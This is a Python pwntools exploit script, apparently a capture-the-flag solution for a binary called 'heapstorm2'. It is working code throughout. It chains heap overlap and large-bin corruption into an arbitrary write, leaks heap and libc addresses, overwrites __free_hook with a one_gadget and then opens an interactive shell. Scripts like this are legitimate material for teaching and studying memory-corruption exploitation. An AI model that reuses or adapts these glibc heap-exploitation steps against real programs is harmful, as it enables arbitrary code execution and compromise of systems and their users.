from pwn import *

context.log_level=1

#p=process('./heapstorm2',env={'LD_PRELOAD':'./libc-2.24.so'})
#elf=ELF('./libc-2.24.so')
#one_gadget=0x3f35a

elf=ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget=0x4526A

sd=lambda x : p.send(x)
sl=lambda x : p.sendline(x)
rv=lambda x : p.recvuntil(x)
sla=lambda a,x : p.sendlineafter(a,x)
sa=lambda a,x : p.sendafter(a,x)

free_hook=elf.symbols['__free_hook']

def alloc(size,):
    sla('Command: ','1')
    sla('Size: ',str(size))

def update(index,content):
    sla('Command: ','2')
    sla('Index: ',str(index))
    sla('Size: ',str(len(content)))
    sla('Content: ',content)

def dele(index):
    sla('Command: ','3')
    sla('Index: ',str(index))

def view(index):
    sla('Command: ','4')
    sla('Index: ',str(index))

while True:

    try:
        p=process('./heapstorm2')
        alloc(0x18)     # 0
        alloc(0x520)    # 1
        alloc(0x18)     # 2
        
        alloc(0x18)     # 3
        alloc(0x520)    # 4
        alloc(0x18)     # 5
        alloc(0x18)     # 6
        
        update(1,'a'*0x4f0+p64(0x500))
        dele(1)
        update(0,'a'*12)
        alloc(0x18)     # 1
        alloc(0x4d0)    # 7
        dele(1)
        dele(2)
        alloc(0x38)     # 1
        alloc(0x500)    # 2
        
        update(4,'a'*0x4f0+p64(0x500))
        dele(4)
        update(3,'a'*12)
        alloc(0x18)     # 4
        alloc(0x4d0)    # 8
        dele(4)
        dele(5)
        alloc(0x48)     # 4
        dele(2)
        alloc(0x500)    # 2
        
        dele(2)
        addr=0x13370000+0x800-0x20
        update(7,p64(0)*3+p64(0x511)+p64(0)+p64(addr))
        update(8,p64(0)*5+p64(0x501)+p64(0)+p64(addr+8)+p64(0)+p64(addr-0x18-5))
        
        alloc(0x48)     # 2
        update(2,p64(0)*5+p64(0x13377331)+p64(addr+0x20+0x30))

        break
        #alloc(0x4f0)   
    except:
    	p.close()
	continue



update(0,p64(addr+3)+p64(8))
view(1)

rv('Chunk[1]: ')
chunk_base=u64(p.recv(6)+2*'\x00')-0x60
log.info('chunk base is:'+hex(chunk_base))

update(0,p64(chunk_base+0x70)+p64(8))
view(1)
rv('Chunk[1]: ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
log.info('libc base is:'+hex(libc_base))

#gdb.attach(p)
update(0,p64(libc_base+free_hook)+p64(8))
update(1,p64(libc_base+one_gadget)+p64(8))

dele(4)

p.interactive()

